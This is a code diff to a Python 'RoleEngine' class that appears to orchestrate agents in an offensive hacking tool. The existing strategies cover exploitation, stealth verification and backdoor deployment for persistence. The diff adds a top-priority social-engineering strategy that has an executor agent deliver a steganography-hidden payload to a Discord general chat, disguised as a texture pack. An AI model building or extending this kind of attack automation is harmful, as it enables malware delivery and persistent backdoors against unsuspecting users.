@@ -33,6 +33,7 @@ class RoleEngine:
             "VULNERABILITY_DETECTED": {"focus": "exploitation", "intensity": "high"},
             "VERIFICATION_NEEDED": {"focus": "stealth_verification", "intensity": "critical"},
             "BACKDOOR_DEPLOYMENT": {"focus": "persistence", "intensity": "critical"},
+            "SOCIAL_ENGINEERING_OPPORTUNITY": {"focus": "payload_delivery", "intensity": "high"}, # New Strategy
             "ERROR_RECOVERY": {"focus": "resilience", "intensity": "medium"}
         }
 
@@ -104,7 +105,18 @@ class RoleEngine:
         self.shared_state["adaptive_strategy"] = strategy
         
         # Generate action based on real-time situation
-        if situation == "VULNERABILITY_DETECTED":
+        if situation == "SOCIAL_ENGINEERING_OPPORTUNITY":
+            # High priority: Deliver steganography payload
+            action = {
+                "target_agent": "EXECUTOR",
+                "action_type": "DELIVER_STEGO_PAYLOAD",
+                "payload": {
+                    "delivery_channel": "Discord",
+                    "target_user": "general_chat",
+                    "message_template": "Check out this new texture pack!"
+                }
+            }
+        elif situation == "VULNERABILITY_DETECTED":
             # Critical: Need stealth verification
             action = {
                 "target_agent": "EXECUTOR",
@@ -165,6 +177,10 @@ class RoleEngine:
                                    vulnerabilities: List[Dict[str, Any]],
                                    state: str) -> str:
         """วิเคราะห์สถานการณ์ปัจจุบันแบบเรียลไทม์"""
+        # Highest priority: Social engineering opportunity
+        if any("DISCORD_CHANNEL_ACTIVE" in obs or "SOCIAL_ENGINEERING_OPPORTUNITY" in obs for obs in observations):
+            return "SOCIAL_ENGINEERING_OPPORTUNITY"
+
         # Check for verification needs
         if any("VERIFICATION_NEEDED" in obs or "VULN_DETECTED" in obs for obs in observations):
             return "VERIFICATION_NEEDED"
